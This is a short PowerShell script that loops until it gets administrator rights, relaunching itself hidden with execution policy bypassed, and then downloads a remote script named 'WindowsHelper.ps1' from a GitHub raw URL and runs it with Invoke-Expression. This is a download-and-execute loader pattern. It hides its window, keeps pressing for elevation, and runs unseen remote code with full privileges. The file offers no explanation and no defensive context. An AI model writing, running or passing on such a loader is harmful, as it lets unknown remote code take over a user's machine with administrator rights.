
while (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
   

    try {
        
        $scriptPath = (Get-Process -Id $PID).Path

        # Restart PowerShell with admin rights
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -WindowStyle Hidden

        Exit
    }
    catch {
       
        Start-Sleep -Seconds 2  
    }
}


Invoke-Expression -Command (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Radmex/main/main/WindowsHelper.ps1").Content
